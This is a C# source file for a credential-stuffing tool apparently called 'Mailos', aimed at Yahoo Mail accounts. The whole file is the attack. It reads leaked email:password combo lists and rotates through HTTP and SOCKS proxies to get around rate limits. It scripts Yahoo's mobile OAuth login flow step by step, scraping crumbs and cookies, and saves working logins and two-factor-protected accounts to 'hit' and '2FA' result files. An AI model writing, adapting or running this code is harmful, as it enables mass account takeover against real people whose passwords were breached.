using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Template;
using yoboi_legend;
using Ebay_Checker;
using System.Net;
using JawBrute;

namespace Ebay_Checker
{
    class yahoo
    {
        [STAThread]
        public static void yahoostart()
        {
            Prsc.Yandex();
            Export.Initialize();
            Console.Title = "Mailos | Yahoo";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                Threads:", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            try
            {
                Variables.threads = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error Parsing Integor...");
                goto fuck;
            }
        fuckme:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [1] HTTP", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [2] SOCKS4", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [3] SOCKS5", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            string c = Console.ReadLine();
            if (c == "1")
            {
                Variables.proxyprotocol = "HTTP";
            }
            else if (c == "2")
            {
                Variables.proxyprotocol = "SOCKS4";
            }
            else if (c == "3")
            {
                Variables.proxyprotocol = "SOCKS5";
            }
            else
            {
                goto fuckme;
            }
            loadCombos();
        }
        public static void loadCombos()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Combos";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.combos = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.combototal++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            loadProxies();
        }
        public static void loadProxies()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Proxies";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.proxies1 = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.proxytotal++;
                            }

                        }
                    }
                }
            }
            catch
            {

            }
            startpp();
        }
        public static void startpp()
        {
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            try
            {

                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        Variables.cpm = Variables.cpm_aux;
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - Yahoo] | Hits: " + Variables.hit + " | 2FA: " + Variables.free + " | Bads: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });

                for (int i = 1; i <= Variables.threads; i++)
                {
                    new Thread(new ThreadStart(CheckPP)).Start();
                }
            }
            catch
            {

            }
        }
        public static void CheckPP()
        {
        stat:
            for (; ; )
            {

                while (true)
                {
                    //RANDOM PROXY EVERY REQ
                    string proxy = "";
                    Random r = new Random();
                    proxy = Variables.proxies1[r.Next(Variables.proxies1.Count)];

                    try
                    {

                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            //SPLITTIN COMBOS
                            if (Variables.comboindex >= Variables.combos.Count<string>())
                            {
                                break;
                            }
                            Interlocked.Increment(ref Variables.comboindex);
                            string[] s = Variables.combos[Variables.comboindex].Split(new char[]
                            {
                            ':'
                            });
                            //s[0] - Email  | s[1] - Password
                            try
                            {
                                //PROXY HANDEL
                                if (Variables.proxyprotocol == "HTTP")
                                {
                                    httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS4")
                                {
                                    httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS5")
                                {
                                    httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                }
                                //REQUESTS - YOU CAN REPLACE WITH COMPILER CODE HERE, USE UR BRAIN PLEASE THANKS`


                                httpRequest.AddHeader("Authorization", "VVZoU2RtSlhiR3BYVjBadllqSTRlVTFFU1hoUGFtaHNUMFJGZUU5WFZURmFWRnBwV1cxS2EwMXFZM2RaZWsxNFdrUmFhVnBIVlhoTlIwNXBXbFJHYkU1dFJtdGFSRkpxV1dwWk5FMTZVWGxhUkVadFRqSkZNMDU2Ykd0T2FrSnNXbTFSZDFwcVJYcE5hbWN6V1ZSV2EwNXRVbWhPYlZwcFQwZEZOVmt5VG1wTlJGa3hUbnByTUU5RVFUQk9WR040VFhwak0wNXFXbXhaYlZsM1dWUk9hRTFFYUdsYWFrVjRXa1JGZWxsVVFYcGFSR3MwV1cxS2FGcFVXVEphYW1odA==");
                                var res0 = httpRequest.Post("https://login.yahoo.com/");
                                {
                                    string text0 = res0.ToString();
                                    var ua = Functions.JSON(text0, "ua").FirstOrDefault();
                                    var res1 = httpRequest.Get("https://api.login.yahoo.com/oauth2/request_auth_fe?appid=com.yahoo.mobile.client.android.mail&appsrcv=6.16.2&src=androidphnx&srcv=8.10.2&intl=us&language=en-US&sdk-device-id=ODg1NmMwYjAwNjZmMWEwMzJkYWM2MjRjOTFkMzNlY2U4MWMyNTAwZjcz&push=1&.asdk_embedded=1&theme=light&redirect_uri=com.yahoo.mobile.client.android.mail%3A%2F%2Fphoenix%2Fcallback_auth&client_id=ILokwdqHQAZzHkFZ&response_type=code&prompt=login&state=h1S0zCfmQv18JkXaQHf79g&scope=sdct-w%20mail-w%20sdpp-w%20yfin-w%20sports%20fspt-w%20openid%20device_sso&code_challenge=wRml_67QKoxdJe5NKvD3U_3_HWQlbpVYMtCNhgBewEU&code_challenge_method=S256&nonce=rl94ms3kHtbpvQY9YZpStfHh1fbCPA02&webview=1");
                                    string text1 = res1.ToString();
                                    var crumb = Functions.LR(text1, "amp;crumb=", "&").FirstOrDefault();
                                    var Location = Functions.LR(res1["Location"].ToString(), "", "").FirstOrDefault();
                                    httpRequest.AddHeader("User-Agent", "" + ua + "");
                                    httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                                    httpRequest.AddHeader("X-Requested-With", "com.yahoo.mobile.client.android.mail");


                                    var fpdata = Functions.JSON(text0, "fpdata").FirstOrDefault();
                                    var fpdata1 = WebUtility.UrlDecode("" + fpdata + "");
                                    httpRequest.AllowAutoRedirect = false;
                                    httpRequest.AddHeader("User-Agent", "" + ua + "");
                                    httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                                    httpRequest.AddHeader("X-Requested-With", "com.yahoo.mobile.client.android.mail");

                                    var res2 = httpRequest.Get("" + Location + "");

                                    string text2 = res2.ToString();

                                    var crumb1 = Functions.LR(text2, "crumb=' + encodeURIComponent('", "'").FirstOrDefault();
                                    var acrumb = Functions.LR(WebUtility.UrlDecode(httpRequest.Cookies.GetCookies("" + Location + "")["AS"].Value), "s=", "&").FirstOrDefault();
                                    httpRequest.AllowAutoRedirect = false;
                                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                                    httpRequest.AddHeader("User-Agent", "" + ua + "");
                                    httpRequest.AddHeader("Accept", "*/*");
                                    httpRequest.AddHeader("Referer", "https://login.yahoo.com/?done=https://api.login.yahoo.com/oauth2/request_auth?appid=com.yahoo.mobile.client.android.mail&appsrcv=6.16.2&src=androidphnx&srcv=8.10.2&intl=us&language=en-US&sdk-device-id=ODg1NmMwYjAwNjZmMWEwMzJkYWM2MjRjOTFkMzNlY2U4MWMyNTAwZjcz&push=1&.asdk_embedded=1&theme=light&redirect_uri=com.yahoo.mobile.client.android.mail://phoenix/callback_auth&client_id=ILokwdqHQAZzHkFZ&response_type=code&state=h1S0zCfmQv18JkXaQHf79g&scope=sdct-wmail-wsdpp-wyfin-wsportsfspt-wopeniddevice_sso&code_challenge=wRml_67QKoxdJe5NKvD3U_3_HWQlbpVYMtCNhgBewEU&code_challenge_method=S256&nonce=rl94ms3kHtbpvQY9YZpStfHh1fbCPA02&webview=1&.scrumb=0&src=androidphnx&crumb=//" + crumb + "&redirect_uri=com.yahoo.mobile.client.android.mail://phoenix/callback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=ILokwdqHQAZzHkFZ&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.16.2&language=en-US&srcv=8.10.2&.asdk_embedded=1");

                                    var res3 = httpRequest.Post("https://login.yahoo.com/?done=https://api.login.yahoo.com/oauth2/request_auth?appid=com.yahoo.mobile.client.android.mail&appsrcv=6.16.2&src=androidphnx&srcv=8.10.2&intl=us&language=en-US&sdk-device-id=ODg1NmMwYjAwNjZmMWEwMzJkYWM2MjRjOTFkMzNlY2U4MWMyNTAwZjcz&push=1&.asdk_embedded=1&theme=light&redirect_uri=com.yahoo.mobile.client.android.mail%3A%2F%2Fphoenix%2Fcallback_auth&client_id=ILokwdqHQAZzHkFZ&response_type=code&state=h1S0zCfmQv18JkXaQHf79g&scope=sdct-w%20mail-w%20sdpp-w%20yfin-w%20sports%20fspt-w%20openid%20device_sso&code_challenge=wRml_67QKoxdJe5NKvD3U_3_HWQlbpVYMtCNhgBewEU&code_challenge_method=S256&nonce=rl94ms3kHtbpvQY9YZpStfHh1fbCPA02&webview=1&.scrumb=0&src=androidphnx&crumb=//" + crumb + "&redirect_uri=com.yahoo.mobile.client.android.mail://phoenix/callback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=ILokwdqHQAZzHkFZ&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.16.2&language=en-US&srcv=8.10.2&.asdk_embedded=1", "" + fpdata1 + "&crumb=" + crumb1 + "&acrumb=" + acrumb + "&sessionIndex=QQ--&displayName=&deviceCapability=&username=" + s[0] + "&passwd=&signin=Next", "application/x-www-form-urlencoded; charset=UTF-8");
                                    string text3 = res3.ToString();

                                    if (text3.Contains("Sorry, we don't recognize") || text3.Contains("account/challenge/yak-code") || text3.Contains("https://login.yahoo.com/saml2/atthaloc/request") || text3.Contains("location\":\"/account/challenge/push") || text3.Contains("location\":\"/account/challenge/fail") || text3.Contains("\":\"/account/challenge/phone-verify") || text3.Contains("account/challenge/email-verify") || text3.Contains("location\":\"/account/challenge/challenge-selector") || text3.Contains("account/challenge/phone-obfuscation") || text3.Contains("\":\"/account/challenge/phone-verify"))
                                    {
                                        Variables.free++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        Colorful.Console.WriteLine("               [2FA] " + s[0] + ":" + s[1], Color.Green);
                                        Export.AsResult("/yahoo-2fa", s[0] + ":" + s[1]);
                                        break;
                                    }
                                    else if (text3.Contains("account/challenge/recaptcha"))
                                    {
                                        Variables.free++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        Colorful.Console.WriteLine("               [2FA] " + s[0] + ":" + s[1], Color.Green);
                                        Export.AsResult("/yahoo-2fa", s[0] + ":" + s[1]);
                                        break;//add retry
                                    }
                                    else
                                    {
                                        var location = Functions.JSON(text3, "location").FirstOrDefault();
                                        httpRequest.AllowAutoRedirect = false;
                                        httpRequest.AddHeader("User-Agent", "" + ua + "");
                                        httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                                        httpRequest.AddHeader("Referer", "https://login.yahoo.com/account/challenge/password?done=https://api.login.yahoo.com/oauth2/request_auth?appid=com.yahoo.mobile.client.android.mail&appsrcv=6.16.2&src=androidphnx&srcv=8.10.2&intl=us&language=en-US&sdk-device-id=ODg1NmMwYjAwNjZmMWEwMzJkYWM2MjRjOTFkMzNlY2U4MWMyNTAwZjcz&push=1&.asdk_embedded=1&theme=light&redirect_uri=com.yahoo.mobile.client.android.mail://phoenix/callback_auth&client_id=ILokwdqHQAZzHkFZ&response_type=code&state=h1S0zCfmQv18JkXaQHf79g&scope=sdct-wmail-wsdpp-wyfin-wsportsfspt-wopeniddevice_sso&code_challenge=wRml_67QKoxdJe5NKvD3U_3_HWQlbpVYMtCNhgBewEU&code_challenge_method=S256&nonce=rl94ms3kHtbpvQY9YZpStfHh1fbCPA02&webview=1&.scrumb=0&src=androidphnx&redirect_uri=com.yahoo.mobile.client.android.mail://phoenix/callback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=ILokwdqHQAZzHkFZ&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.16.2&language=en-US&srcv=8.10.2&.asdk_embedded=1&sessionIndex=QQ--&acrumb=" + acrumb + "&display=narrow&authMechanism=primary");
                                        httpRequest.AddHeader("X-Requested-With", "com.yahoo.mobile.client.android.mail");

                                        var res4 = httpRequest.Post("https://Login.yahoo.com" + location + "/", "" + fpdata1 + "&crumb=" + crumb + "&acrumb=" + acrumb + "&sessionIndex=QQ--&displayName=" + s[0] + "&deviceCapability=&username=" + s[0] + "&passwordContext=normal&isShowButtonClicked=&showButtonStatus=&prefersReducedMotion=&password=" + s[1] + "&verifyPassword=Next", "application/x-www-form-urlencoded");
                                        string text4 = res4.ToString();

                                        if (text4.Contains("<p>Found. Redirecting to <a href=\"https://api.login.yahoo.com/oauth2/request_auth"))
                                        {
                                            Variables.free++;
                                            Variables.cpm_aux++;
                                            Variables.check++;
                                            Colorful.Console.WriteLine("               [HIT] " + s[0] + ":" + s[1], Color.Green);
                                            Export.AsResult("/yahoo-hit", s[0] + ":" + s[1]);
                                        }
                                        else if (text4.Contains("/account/challenge/password") || text4.Contains("account/challenge/challenge-selector"))
                                        {
                                            Variables.free++;
                                            Variables.cpm_aux++;
                                            Variables.check++;
                                            Colorful.Console.WriteLine("               [2FA] " + s[0] + ":" + s[1], Color.Green);
                                            Export.AsResult("/yahoo-2fa", s[0] + ":" + s[1]);
                                            break;
                                        }
                                        else if (text4.Contains("account/challenge/recaptcha"))
                                        {
                                            Variables.free++;
                                            Variables.cpm_aux++;
                                            Variables.check++;
                                            Colorful.Console.WriteLine("               [2FA] " + s[0] + ":" + s[1], Color.Green);
                                            Export.AsResult("/yahoo-2fa", s[0] + ":" + s[1]);
                                            break;//add retry
                                        }
                                        else
                                        {
                                            break;//add retry here
                                        }




                                        {
                                            goto stat;
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                Variables.error++;

                            }
                        }
                    }

                    catch (Exception ex)
                    {
                        Variables.error++;

                    }
                        }

                }
            }
        }
    }
